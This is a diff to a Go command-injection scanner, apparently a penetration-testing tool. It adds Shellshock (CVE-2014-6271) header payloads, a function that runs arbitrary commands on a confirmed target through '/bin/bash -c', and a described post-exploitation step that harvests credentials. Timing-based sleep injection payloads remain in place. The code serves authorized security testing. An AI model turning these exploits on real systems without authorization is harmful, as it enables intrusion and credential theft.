@@ -1,13 +1,18 @@
-// Package cmdinj implements an OS command injection scanner using the same
-// calibration-based timing analysis as the SQLi scanner. Payloads use sleep
-// commands across different OS families (Unix, Windows).
+// Package cmdinj implements an OS command injection scanner with two detection
+// modes and a post-exploitation pipeline:
 //
-// Detection flow:
-//  1. Baseline latency measurement (median of 5 requests)//  2. Inject `; sleep 3` — verify delta > 2.5s over baseline
-//  3. Confirm with `; sleep 5` — verify delta tracks proportionally
-//  4. Optional: OOB confirmation via `nslookup TOKEN.oob.domain`
+// 1. Timing-based detection: calibrated sleep injection in query parameters
+//    (baseline → sleep 3 → verify delta > 2.5s → sleep 5 → proportional confirm)
 //
-// Only runs in authorized mode (--authorized flag).
+// 2. Shellshock detection (CVE-2014-6271): crafted function definitions in HTTP
+//    headers sent to CGI endpoints — marker string in response confirms execution
+//
+// Post-exploitation (ScanAuthorized only): after confirming command injection,
+// runs reconnaissance (env, /etc/hosts, ARP, ifconfig), discovers internal hosts,
+// probes for services (Redis, Elasticsearch, databases), and extracts data/creds
+// through the injection point.
+//
+// Detection runs at ScanDeep; post-exploitation requires ScanAuthorized.
 package cmdinj
 
 import (
@@ -21,27 +26,30 @@ import (
 	"strings"
 	"time"
 
-	"github.com/stormbane-security/beacon/internal/scan"
 	"github.com/stormbane-security/beacon/internal/finding"
 	"github.com/stormbane-security/beacon/internal/module"
 	"github.com/stormbane-security/beacon/internal/oob"
+	"github.com/stormbane-security/beacon/internal/scan"
 	"github.com/stormbane-security/beacon/internal/scanner/authctx"
 )
-
 
 func init() {
 	scan.Register(scannerName, func(_ scan.ScannerConfig) scan.Scanner {
 		return New()
 	})
 }
-const scannerName = "cmdinj"
+
+const (
+	scannerName     = "cmdinj"
+	shellshockMark  = "BEACON_CMDINJ_8f3a2c"
+)
 
 type payload struct {
-	name   string // human label
-	os     string // unix, windows, any
-	prefix string // injected before the sleep command
+	name    string // human label
+	os      string // unix, windows, any
+	prefix  string // injected before the sleep command
 	sleepFn string // sleep command template (%d = seconds)
-	suffix string // injected after
+	suffix  string // injected after
 }
 
 var payloads = []payload{
@@ -60,7 +68,7 @@ var payloads = []payload{
 	{name: "win-timeout", os: "windows", prefix: "& timeout /t ", sleepFn: "%d", suffix: " >nul"},
 }
 
-// Paths and parameters commonly vulnerable to command injection.
+// probePaths are paths and parameters commonly vulnerable to command injection.
 var probePaths = []struct {
 	path   string
 	params []string
@@ -72,7 +80,24 @@ var probePaths = []struct {
 	{"/api/health", []string{"check", "host"}},
 }
 
-// Scanner checks for OS command injection via timing analysis.
+// shellshockPaths are CGI paths commonly vulnerable to Shellshock.
+var shellshockPaths = []string{
+	"/cgi-bin/vulnerable",
+	"/cgi-bin/test",
+	"/cgi-bin/status",
+	"/cgi-bin/bash",
+	"/cgi-bin/env",
+	"/cgi-bin/",
+}
+
+// shellshockHeaders are HTTP headers to test for Shellshock injection.
+var shellshockHeaders = []string{
+	"User-Agent",
+	"Referer",
+	"Cookie",
+}
+
+// Scanner checks for OS command injection via timing analysis and Shellshock.
 type Scanner struct{}
 
 func New() *Scanner { return &Scanner{} }
@@ -80,17 +105,17 @@ func New() *Scanner { return &Scanner{} }
 func (s *Scanner) Name() string { return scannerName }
 
 func (s *Scanner) Run(ctx context.Context, asset string, scanType module.ScanType) ([]finding.Finding, error) {
-	if scanType != module.ScanAuthorized {
+	if scanType != module.ScanDeep && scanType != module.ScanAuthorized {
 		return nil, nil
 	}
 
-	client := authctx.HTTPClient(ctx)
-	client = &http.Client{
+	ac := authctx.HTTPClient(ctx)
+	client := &http.Client{
 		Timeout: 30 * time.Second,
 		Transport: &http.Transport{
 			TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, //nolint:gosec
 		},
-		Jar: client.Jar,
+		Jar: ac.Jar,
 	}
 
 	scheme := detectScheme(ctx, client, asset)
@@ -98,6 +123,125 @@ func (s *Scanner) Run(ctx context.Context, asset string, scanType module.ScanTyp
 		return nil, nil
 	}
 
+	var findings []finding.Finding
+
+	// Phase 1: Shellshock detection (CVE-2014-6271)
+	shellFindings := s.shellshockProbe(ctx, client, scheme, asset, scanType)
+	findings = append(findings, shellFindings...)
+
+	// Phase 2: Timing-based parameter injection
+	paramFindings := s.timingProbe(ctx, client, scheme, asset, scanType)
+	findings = append(findings, paramFindings...)
+
+	return findings, nil
+}
+
+// shellshockProbe detects Shellshock (CVE-2014-6271) by injecting function
+// definitions into HTTP headers sent to CGI endpoints.
+func (s *Scanner) shellshockProbe(ctx context.Context, client *http.Client, scheme, asset string, scanType module.ScanType) []finding.Finding {
+	var findings []finding.Finding
+
+	for _, path := range shellshockPaths {
+		for _, header := range shellshockHeaders {
+			if ctx.Err() != nil {
+				return findings
+			}
+
+			targetURL := fmt.Sprintf("%s://%s%s", scheme, asset, path)
+			req, err := http.NewRequestWithContext(ctx, http.MethodGet, targetURL, nil)
+			if err != nil {
+				continue
+			}
+
+			// Shellshock payload: bash function definition followed by command.
+			// The () { :;}; pattern exploits CVE-2014-6271 where bash processes
+			// trailing commands in function definitions stored in env vars.
+			shellPayload := fmt.Sprintf("() { :;}; echo; echo %s", shellshockMark)
+			req.Header.Set(header, shellPayload)
+
+			resp, err := client.Do(req)
+			if err != nil {
+				continue
+			}
+			body, _ := io.ReadAll(io.LimitReader(resp.Body, 8192))
+			resp.Body.Close()
+
+			if !strings.Contains(string(body), shellshockMark) {
+				continue
+			}
+
+			findings = append(findings, finding.Finding{
+				CheckID:  finding.CheckWebCmdInjection,
+				Module:   "deep",
+				Scanner:  scannerName,
+				Severity: finding.SeverityCritical,
+				Title:    fmt.Sprintf("Shellshock (CVE-2014-6271): command injection via %s on %s", header, path),
+				Description: fmt.Sprintf(
+					"The CGI endpoint at %s is vulnerable to Shellshock (CVE-2014-6271). "+
+						"Commands injected via the %s header are executed by the server and "+
+						"output is returned in the response body. This allows arbitrary "+
+						"command execution on the server.",
+					path, header),
+				Asset:    asset,
+				DeepOnly: true,
+				Evidence: map[string]any{
+					"path":          path,
+					"header":        header,
+					"cve":           "CVE-2014-6271",
+					"marker_echoed": true,
+				},
+				ProofCommand: fmt.Sprintf(
+					`curl -s -H '%s: () { :;}; echo; /bin/id' '%s'`,
+					header, targetURL),
+				DiscoveredAt: time.Now(),
+			})
+
+			// Post-exploitation: only in authorized mode.
+			if scanType == module.ScanAuthorized {
+				execCmd := func(cmd string) (string, error) {
+					return shellshockExec(ctx, client, targetURL, header, cmd)
+				}
+				postFindings := postExploit(ctx, execCmd, asset, path, header)
+				findings = append(findings, postFindings...)
+			}
+
+			// One confirmed Shellshock finding is enough — stop all probes.
+			return findings
+		}
+	}
+
+	return findings
+}
+
+// shellshockExec executes a command through a confirmed Shellshock injection
+// point and returns the command output.
+func shellshockExec(ctx context.Context, client *http.Client, targetURL, header, cmd string) (string, error) {
+	req, err := http.NewRequestWithContext(ctx, http.MethodGet, targetURL, nil)
+	if err != nil {
+		return "", err
+	}
+
+	// Wrap command in /bin/bash -c for reliable execution.
+	shellPayload := fmt.Sprintf("() { :;}; echo; /bin/bash -c '%s'", cmd)
+	req.Header.Set(header, shellPayload)
+
+	resp, err := client.Do(req)
+	if err != nil {
+		return "", err
+	}
+	defer resp.Body.Close()
+
+	body, err := io.ReadAll(io.LimitReader(resp.Body, 64*1024))
+	if err != nil {
+		return "", err
+	}
+
+	return strings.TrimSpace(string(body)), nil
+}
+
+// timingProbe detects command injection via calibrated sleep timing on query
+// parameters. Same logic as before, factored into its own method.
+func (s *Scanner) timingProbe(ctx context.Context, client *http.Client, scheme, asset string, scanType module.ScanType) []finding.Finding {
 	var findings []finding.Finding
 
 	for _, pp := range probePaths {
@@ -111,7 +255,6 @@ func (s *Scanner) Run(ctx context.Context, asset string, scanType module.ScanTyp
 			}
 
 			baseURL := fmt.Sprintf("%s://%s%s?%s=test", scheme, asset, pp.path, param)
-
 			baseline, err := measureBaseline(ctx, client, baseURL, 5)
 			if err != nil {
 				continue
@@ -122,7 +265,6 @@ func (s *Scanner) Run(ctx context.Context, asset string, scanType module.ScanTyp
 					break
 				}
 
-				// First probe: sleep 3
 				injected3 := buildPayload(p, 3)
 				testURL3 := fmt.Sprintf("%s://%s%s?%s=%s", scheme, asset, pp.path, param, url.QueryEscape("test"+injected3))
 				latency3, err := timeRequest(ctx, client, testURL3)
@@ -135,7 +277,6 @@ func (s *Scanner) Run(ctx context.Context, asset string, scanType module.ScanTyp
 					continue
 				}
 
-				// Confirm: sleep 5
 				injected5 := buildPayload(p, 5)
 				testURL5 := fmt.Sprintf("%s://%s%s?%s=%s", scheme, asset, pp.path, param, url.QueryEscape("test"+injected5))
 				latency5, err := timeRequest(ctx, client, testURL5)
@@ -150,7 +291,7 @@ func (s *Scanner) Run(ctx context.Context, asset string, scanType module.ScanTyp
 
 				findings = append(findings, finding.Finding{
 					CheckID:  finding.CheckWebCmdInjection,
-					Module:   "surface",
+					Module:   "deep",
 					Scanner:  scannerName,
 					Severity: finding.SeverityCritical,
 					Title:    fmt.Sprintf("OS command injection in %s parameter at %s", param, pp.path),
@@ -160,7 +301,8 @@ func (s *Scanner) Run(ctx context.Context, asset string, scanType module.ScanTyp
 							"OS type: %s. Payload: %s",
 						baseline.Round(time.Millisecond), delta3.Round(time.Millisecond),
 						delta5.Round(time.Millisecond), p.os, p.name),
-					Asset: asset,
+					Asset:    asset,
+					DeepOnly: true,
 					Evidence: map[string]any{
 						"path":            pp.path,
 						"parameter":       param,
@@ -198,14 +340,15 @@ func (s *Scanner) Run(ctx context.Context, asset string, scanType module.ScanTyp
 				if cb, ok := oobSrv.WaitForCallback(ctx, token, 5*time.Second); ok {
 					findings = append(findings, finding.Finding{
 						CheckID:  finding.CheckWebCmdInjection,
-						Module:   "surface",
+						Module:   "deep",
 						Scanner:  scannerName,
 						Severity: finding.SeverityCritical,
 						Title:    fmt.Sprintf("OOB command injection confirmed in %s at %s", param, pp.path),
 						Description: fmt.Sprintf(
 							"Out-of-band DNS callback received from %s after nslookup injection, "+
 								"confirming OS command injection.", cb.RemoteAddr),
-						Asset: asset,
+						Asset:    asset,
+						DeepOnly: true,
 						Evidence: map[string]any{
 							"path":        pp.path,
 							"parameter":   param,
@@ -220,7 +363,7 @@ func (s *Scanner) Run(ctx context.Context, asset string, scanType module.ScanTyp
 		}
 	}
 
-	return findings, nil
+	return findings
 }
 
 func buildPayload(p payload, seconds int) string {
@@ -260,12 +403,6 @@ func timeRequest(ctx context.Context, client *http.Client, rawURL string) (time.
 }
 
 func detectScheme(ctx context.Context, client *http.Client, asset string) string {
-	host := asset
-	if idx := strings.LastIndex(asset, ":"); idx != -1 {
-		host = asset[:idx]
-	}
-	_ = host
-
 	for _, scheme := range []string{"https", "http"} {
 		req, err := http.NewRequestWithContext(ctx, http.MethodHead, scheme+"://"+asset+"/", nil)
 		if err != nil {
